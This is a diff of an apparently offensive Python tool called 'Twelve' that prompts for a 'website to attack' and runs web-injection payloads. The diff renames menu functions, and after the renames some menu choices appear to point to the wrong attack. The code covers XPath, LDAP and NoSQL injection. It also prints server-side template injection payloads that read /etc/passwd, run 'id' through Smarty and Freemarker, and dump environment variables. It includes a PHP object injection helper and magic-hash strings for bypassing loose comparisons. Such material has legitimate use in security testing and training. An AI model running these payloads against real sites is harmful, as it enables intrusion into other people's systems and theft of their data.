@@ -23,8 +23,6 @@ def menu():
 		X()
 	elif choice == 8:
 		VIII()
-	elif choice == 12:
-		XII()
 	elif choice == 11:
 		XI()
 	elif choice == 4:
@@ -49,7 +47,7 @@ def menu():
 def VI():
 	print("XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.")
 	site = input("Website to attack (with the potentially vulnerable parameter last) > ")
-	sql = 0
+	xpath = 0
 	while xpath == 0:
 		try:
 			f = open("XPATH.txt", "r")
@@ -75,10 +73,10 @@ def VI():
 		menu() if rep == "y" else sys.exit(0)
 
 
-def VIII():
+def VII():
 	print("LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements using a local proxy.")
 	site = input("Website to attack (with the potentially vulnerable parameter last) > ")
-	sql = 0
+	ldap = 0
 	while ldap == 0:
 		try:
 			f = open("LDAP.txt", "r")
@@ -103,7 +101,7 @@ def VIII():
 		rep = input("Would you like to restart Twelve ? (y/n) > ")
 		menu() if rep == "y" else sys.exit(0)
 
-def X():
+def IX():
 	print("Template injection allows an attacker to include template code into an existant (or not) template.")
 	print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n+ Ruby                                 + Java                                                          + \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n+ <%= 7 * 7 %>                         + ${7*7}                                                        + \n+ <%= File.open('/etc/passwd').read %> + ${{7*7}}                                                      + \n++++++++++++++++++++++++++++++++++++++++ ${class.getResource(\"../../../../../index.htm\").getContent()} + \n                                       + ${T(java.lang.System).getenv()}                               + \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n+ Twig      + Smarty                + Freemarker                                                    + \n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n+ {{7*'7'}} + {php}echo `id`;{/php} + <#assign                                                      + \n+++++++++++++++++++++++++++++++++++++ ex = \"freemarker.template.utility.Execute\"?new()>${ ex(\"id\")} + \n                                    +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
 	print("\nMore infos here: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections")
@@ -297,7 +295,7 @@ def I():
 
 
 
-def IX():
+def VIII():
 	print("NoSQL databases provide looser consistency restrictions than traditional SQL databases. By requiring fewer relational constraints and consistency checks, NoSQL databases often offer performance and scaling benefits. Yet these databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional SQL syntax.")
 	site = input("Website to attack (with the potentially vulnerable parameter last, without value & add {$injection} between the parameter's name and the \"=\") > ")
 	error = input("Error message > ")
@@ -347,7 +345,7 @@ def IV():
 
 
 
-def XII():
+def XI():
 	print("PHP Object Injection is an application level vulnerability that could allow an attacker to perform different kinds of malicious attacks, such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service, depending on the context. The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP object(s) injection into the application scope.\n")
 	cmd = input("PHP to serialize > ")
 	result = requests.get('http://localhost/Twelve/ObjectInjection.php?cmd=' + cmd).text
@@ -359,7 +357,7 @@ def XII():
 
 
 
-def XI():
+def X():
 	print("A loose comparison is one performed using two equals signs (==). It follows suit with the \"best-guess\" approach, which can lead to some unexpected results.")
 	print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ Hash Type ++ Hash Length ++ Magic String ++ Magic Hashes                                     ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ md5       ++ 32          ++ 240610708    ++ 0e462097431906509019562988736854                 ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ sha1      ++ 40          ++ 10932435112  ++ 0e07766915004133176347055865026311692244         ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ ripemd128 ++ 32          ++ 315655854    ++ 0e251331818775808475952406672980                 ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ \n++ tiger128  ++ 32          ++ 265022640    ++ 0e908730200858058999593322639865                 ++ \n++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\nMore Magic Hashes here: https://www.whitehatsec.com/blog/magic-hashes/\n")
 	rep = input("Would you like to restart Twelve ? (y/n) > ")
